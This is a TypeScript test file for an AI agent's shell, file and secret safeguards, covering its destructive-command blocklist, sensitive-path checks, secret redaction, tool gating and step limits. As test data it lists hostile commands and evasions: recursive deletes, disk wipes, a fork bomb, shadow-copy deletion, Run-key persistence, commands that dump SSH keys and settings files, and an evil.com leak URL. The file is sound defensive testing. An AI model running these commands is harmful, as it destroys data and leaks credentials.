import assert from "node:assert/strict";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { test } from "node:test";
import {
  agentShellVerdict,
  buildTools,
  containsSecret,
  isDestructive,
  isSensitivePath,
  redactSecrets,
  runAgentTask,
  shellTouchesSecrets,
  type AgentConfig,
  type AgentRunDeps,
} from "./agent";
import type { AgentMsg, AgentTurn, LlmCreds, ToolSpec } from "../llm";

// ── destructive-command detector ─────────────────────────────────────────────

test("isDestructive catches the obvious disasters, chained or not", () => {
  for (const cmd of [
    "rm -rf /",
    "rm -r node_modules",
    "npm install && rm -rf ~",
    "del /s /q C:\\Users",
    "rmdir /s /q build",
    "Remove-Item -Recurse -Force C:\\",
    "format C:",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/sda",
    "shutdown /s /t 0",
    "reg delete HKLM\\Software /f",
    "net user hacker hunter2 /add",
    "netsh advfirewall set allprofiles state off",
    "git push origin main --force",
    ":(){ :|:& };:",
  ]) {
    assert.equal(isDestructive(cmd), true, `should refuse: ${cmd}`);
  }
});

test("isDestructive lets normal dev commands through", () => {
  for (const cmd of [
    "git status",
    "npm install",
    "npm run build",
    "git clone https://github.com/x/y",
    "node script.mjs",
    "python -m pytest",
    "dir",
    "ls -la",
    "git push origin main",
    "npx tsc --noEmit",
    "cargo build --release",
    "del temp.txt", // plain del without /s /q is not bulk destruction
  ]) {
    assert.equal(isDestructive(cmd), false, `should allow: ${cmd}`);
  }
});

// ── secrets guards ───────────────────────────────────────────────────────────

test("sensitive paths are refused; normal ones aren't", () => {
  for (const p of [".env", "app/.env.local", "grant.json", "C:\\Users\\me\\.merrymen\\settings.json", ".ssh/id_rsa", "wallet.dat", "keys/server.pem"]) {
    assert.equal(isSensitivePath(p), true, `sensitive: ${p}`);
  }
  for (const p of ["src/index.ts", "README.md", "package.json", "envelope.txt", "docs/environment.md"]) {
    assert.equal(isSensitivePath(p), false, `plain: ${p}`);
  }
  assert.equal(shellTouchesSecrets("type C:\\Users\\me\\.merrymen\\grant.json"), true);
  assert.equal(shellTouchesSecrets("cat ~/.ssh/id_rsa"), true);
  assert.equal(shellTouchesSecrets("npm run build"), false);
});

// ── the full shell decision ─────────────────────────────────────────────────

test("agentShellVerdict: allowlist match runs even with auto-shell off", () => {
  const v = agentShellVerdict("git status", { allowlist: ["git status"], autoShell: false });
  assert.deepEqual(v, { run: true });
});

test("agentShellVerdict: beyond allowlist needs auto-shell", () => {
  const off = agentShellVerdict("npm install", { allowlist: [], autoShell: false });
  assert.equal(off.run, false);
  const on = agentShellVerdict("npm install", { allowlist: [], autoShell: true });
  assert.deepEqual(on, { run: true });
});

test("agentShellVerdict: destructive and secrets refused even with auto-shell", () => {
  assert.equal(agentShellVerdict("rm -rf /", { allowlist: [], autoShell: true }).run, false);
  assert.equal(agentShellVerdict("cat .env", { allowlist: [], autoShell: true }).run, false);
  // …even if someone allowlisted it
  assert.equal(agentShellVerdict("rm -rf build", { allowlist: ["rm -rf build"], autoShell: true }).run, false);
});

// ── capability gating of the tool catalog ────────────────────────────────────

const baseCfg = (over: Partial<AgentConfig>): AgentConfig => ({
  capabilities: new Set(),
  filesRoot: undefined,
  shellAllowlist: [],
  appAllowlist: [],
  autoShell: false,
  maxSteps: 10,
  anthropicApiKey: undefined,
  llmModel: "m",
  secrets: [],
  ...over,
});

const io = (remember: (n: string) => boolean = () => true) => ({
  opts: { token: "t" },
  chatId: 1,
  cwd: { value: "" },
  note: () => {},
  remember,
});

test("no capabilities → no tools (not even remember)", () => {
  assert.equal(buildTools(baseCfg({}), io()).length, 0);
});

test("each capability arms exactly its tools (+ remember once any action tool exists)", () => {
  const names = (cfg: AgentConfig) => buildTools(cfg, io()).map((t) => t.spec.name).sort();
  assert.deepEqual(names(baseCfg({ capabilities: new Set(["shell"]) })), ["remember", "run"]);
  assert.deepEqual(names(baseCfg({ capabilities: new Set(["files"]) })), ["list_dir", "read_file", "remember", "send_file", "write_file"]);
  assert.deepEqual(names(baseCfg({ capabilities: new Set(["screen"]) })), ["remember", "screenshot"]);
  assert.deepEqual(names(baseCfg({ capabilities: new Set(["apps"]) })), ["open", "remember"]);
  // keyboard is RCE-equivalent → dark unless auto-shell is armed
  assert.deepEqual(names(baseCfg({ capabilities: new Set(["keyboard"]) })), []);
  assert.deepEqual(names(baseCfg({ capabilities: new Set(["keyboard"]), autoShell: true })), ["hotkey", "remember", "type_text"]);
  // vision without an Anthropic key stays dark (and no action tool → no remember either)
  assert.deepEqual(names(baseCfg({ capabilities: new Set(["vision"]) })), []);
  assert.deepEqual(names(baseCfg({ capabilities: new Set(["vision"]), anthropicApiKey: "sk" })), ["look", "remember"]);
});

test("open tool refuses arbitrary URLs in safe mode (auto-shell off)", async () => {
  const safe = buildTools(baseCfg({ capabilities: new Set(["apps"]) }), io()).find((t) => t.spec.name === "open")!;
  const out = await safe.exec({ target: "https://evil.com/c?d=leak" });
  assert.match(out, /REFUSED/);
  assert.match(out, /auto-shell/); // the URL branch is gated, not the app branch
  // an app not on the allowlist is refused too (no side-effecting launch)
  assert.match(await safe.exec({ target: "notepad" }), /allowlist/);
});

// ── expanded destructive blocklist (the review's confirmed evasions) ─────────

test("isDestructive catches cmd/PowerShell aliases and interpreter deletes", () => {
  for (const cmd of [
    'rd /s /q "C:\\Users\\me\\Documents"',
    "erase /s /q C:\\data\\*",
    "powershell -c \"ri C:\\x -Recurse -Force\"",
    "Remove-Item C:\\x -Rec -fo",
    'node -e "require(\'fs\').rmSync(p,{recursive:true})"',
    "python -c \"import shutil; shutil.rmtree('x')\"",
    "git clean -fdx",
    "vssadmin delete shadows /all /quiet",
    "truncate -s 0 important.db",
    'powershell -c "Stop-Computer -Force"',
    'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v x /d evil /f',
    "sdelete -p 3 secret.txt",
  ]) {
    assert.equal(isDestructive(cmd), true, `should refuse: ${cmd}`);
  }
});

test("isDestructive still lets normal dev commands through", () => {
  for (const cmd of ["git clone https://github.com/x/y", "npm install", "node build.mjs", "python -m pytest", "git status", "npm run build", "reg query HKCU", "git push origin main"]) {
    assert.equal(isDestructive(cmd), false, `should allow: ${cmd}`);
  }
});

test("shellTouchesSecrets catches the glob/recursion evasions, not just literal names", () => {
  assert.equal(shellTouchesSecrets('for /r "%USERPROFILE%" %f in (set*.json) do @type "%f"'), true);
  assert.equal(shellTouchesSecrets('for /r "%USERPROFILE%" %f in (gr*.json) do @copy "%f" x'), true);
  assert.equal(shellTouchesSecrets("dir /s C:\\Users\\me\\*.key"), true);
  assert.equal(shellTouchesSecrets("type settings.json"), true);
  assert.equal(shellTouchesSecrets("npm run build"), false);
});

test("agentShellVerdict refuses the evasions even with auto-shell armed", () => {
  const auto = { allowlist: [] as string[], autoShell: true };
  assert.equal(agentShellVerdict('rd /s /q "C:\\x"', auto).run, false);
  assert.equal(agentShellVerdict('node -e "require(\'fs\').rmSync(x)"', auto).run, false);
  assert.equal(agentShellVerdict('for /r "%USERPROFILE%" %f in (set*.json) do @type "%f"', auto).run, false);
  assert.equal(agentShellVerdict('reg add "HKCU\\...\\Run" /v x /d y /f', auto).run, false);
});

// ── secret-VALUE redaction (the durable, evasion-resistant control) ──────────

test("redactSecrets strips known values and key-shaped blobs", () => {
  const known = ["123456:AAExampleBotTokenValueHere_longenough"];
  const dump = "token=123456:AAExampleBotTokenValueHere_longenough key=sk-ant-api03-ABCDEFGHIJKLMNOP pk=0x" + "a".repeat(64);
  const red = redactSecrets(dump, known);
  assert.ok(!red.includes("AAExampleBotTokenValueHere"), "known bot token stripped");
  assert.ok(!red.includes("sk-ant-api03-ABCDEFGHIJKLMNOP"), "api key shape stripped");
  assert.ok(!red.includes("0x" + "a".repeat(64)), "private key shape stripped");
  assert.match(red, /\[redacted\]/);
  // leaves normal build output alone
  assert.equal(redactSecrets("Compiled successfully in 4.9s", known), "Compiled successfully in 4.9s");
});

test("containsSecret detects a laundered secret file's bytes", () => {
  assert.equal(containsSecret('{"session":"0x' + "b".repeat(64) + '"}', []), true); // grant-shaped
  assert.equal(containsSecret("MYTOKEN=123456:AAExampleBotTokenValueHere_x", ["123456:AAExampleBotTokenValueHere_x"]), true);
  assert.equal(containsSecret("# My project notes\nBuild passes.", []), false);
});

test("the remember tool persists via the injected callback", async () => {
  const saved: string[] = [];
  const tools = buildTools(baseCfg({ capabilities: new Set(["files"]), filesRoot: os.tmpdir() }), io((n) => {
    saved.push(n);
    return true;
  }));
  const remember = tools.find((t) => t.spec.name === "remember")!;
  const out = await remember.exec({ note: "The Sakura-ios repo is missing hianime.ts" });
  assert.match(out, /remember/i);
  assert.deepEqual(saved, ["The Sakura-ios repo is missing hianime.ts"]);
});

// ── the loop (scripted model, real file tools in a temp root) ────────────────

const CREDS: LlmCreds = { provider: "test", transport: "openai", baseUrl: "http://x", apiKey: "k", model: "m", vision: false };

function makeDeps(cfg: AgentConfig, turns: AgentTurn[], sent: string[], seen?: AgentMsg[][]): AgentRunDeps {
  let i = 0;
  return {
    creds: CREDS,
    cfg,
    opts: { token: "t" },
    chatId: 1,
    send: async (t) => {
      sent.push(t);
    },
    note: () => {},
    remember: () => true,
    soulBlock: "IDENTITY: you are Robin.",
    stopFlag: { stopped: false },
    turnFn: async (_creds, opts: { messages: AgentMsg[]; tools: ToolSpec[]; system: string }) => {
      seen?.push(structuredClone(opts.messages));
      return turns[Math.min(i++, turns.length - 1)]!;
    },
  };
}

test("loop: streams text, executes tools, stops when the model stops", async () => {
  const root = mkdtempSync(path.join(os.tmpdir(), "mm-agent-"));
  try {
    writeFileSync(path.join(root, "hello.txt"), "hi");
    const sent: string[] = [];
    const seen: AgentMsg[][] = [];
    const deps = makeDeps(
      baseCfg({ capabilities: new Set(["files"]), filesRoot: root }),
      [
        { text: "let me look around", toolUses: [{ id: "1", name: "list_dir", input: {} }] },
        { text: "done — found hello.txt", toolUses: [] },
      ],
      sent,
      seen,
    );
    await runAgentTask("what's in the folder?", deps);
    assert.deepEqual(sent, ["let me look around", "done — found hello.txt"]);
    // the tool result made it back to the model on the second turn
    const second = seen[1]!;
    const toolMsg = second.find((m) => m.role === "tools");
    assert.ok(toolMsg && toolMsg.role === "tools" && toolMsg.results[0]!.output.includes("hello.txt"));
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("loop: a refused shell command surfaces to the model as REFUSED, not an exception", async () => {
  const sent: string[] = [];
  const seen: AgentMsg[][] = [];
  const deps = makeDeps(
    baseCfg({ capabilities: new Set(["shell"]), autoShell: false }),
    [
      { text: "", toolUses: [{ id: "1", name: "run", input: { command: "npm install" } }] },
      { text: "understood", toolUses: [] },
    ],
    sent,
    seen,
  );
  await runAgentTask("install deps", deps);
  const toolMsg = seen[1]!.find((m) => m.role === "tools");
  assert.ok(toolMsg && toolMsg.role === "tools" && toolMsg.results[0]!.output.startsWith("REFUSED"));
});

test("loop: hits the step budget and says so", async () => {
  const sent: string[] = [];
  const deps = makeDeps(
    baseCfg({ capabilities: new Set(["files"]), filesRoot: os.tmpdir(), maxSteps: 2 }),
    [{ text: "still going", toolUses: [{ id: "1", name: "list_dir", input: {} }] }],
    sent,
  );
  await runAgentTask("loop forever", deps);
  assert.equal(sent.filter((s) => s === "still going").length, 2);
  assert.ok(sent[sent.length - 1]!.includes("step budget"));
});

test("loop: the stop flag halts before the next step", async () => {
  const sent: string[] = [];
  const deps = makeDeps(
    baseCfg({ capabilities: new Set(["files"]), filesRoot: os.tmpdir(), maxSteps: 10 }),
    [{ text: "working", toolUses: [{ id: "1", name: "list_dir", input: {} }] }],
    sent,
  );
  const turnFn = deps.turnFn!;
  deps.turnFn = async (c, o) => {
    deps.stopFlag.stopped = true; // owner sends /agent stop mid-turn
    return turnFn(c, o);
  };
  await runAgentTask("task", deps);
  assert.ok(sent.some((s) => s.includes("stopped")));
  assert.equal(sent.filter((s) => s === "working").length, 1);
});

test("loop: no armed tools → honest refusal, no model call", async () => {
  const sent: string[] = [];
  const deps = makeDeps(baseCfg({}), [{ text: "should never run", toolUses: [] }], sent);
  await runAgentTask("task", deps);
  assert.equal(sent.length, 1);
  assert.ok(sent[0]!.includes("no agent tools"));
});

test("loop: file write + read round-trip inside the root; secrets path refused", async () => {
  const root = mkdtempSync(path.join(os.tmpdir(), "mm-agent-"));
  try {
    const sent: string[] = [];
    const seen: AgentMsg[][] = [];
    const deps = makeDeps(
      baseCfg({ capabilities: new Set(["files"]), filesRoot: root }),
      [
        {
          text: "",
          toolUses: [
            { id: "1", name: "write_file", input: { path: "report/notes.md", content: "# hi" } },
            { id: "2", name: "read_file", input: { path: "report/notes.md" } },
            { id: "3", name: "read_file", input: { path: ".env" } },
            { id: "4", name: "read_file", input: { path: "../outside.txt" } },
          ],
        },
        { text: "done", toolUses: [] },
      ],
      sent,
      seen,
    );
    await runAgentTask("write then read", deps);
    const results = seen[1]!.find((m) => m.role === "tools");
    assert.ok(results && results.role === "tools");
    assert.ok(results.results[0]!.output.includes("wrote"));
    assert.equal(results.results[1]!.output, "# hi");
    assert.ok(results.results[2]!.output.startsWith("REFUSED")); // secrets
    assert.ok(results.results[3]!.output.startsWith("REFUSED")); // escape
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});
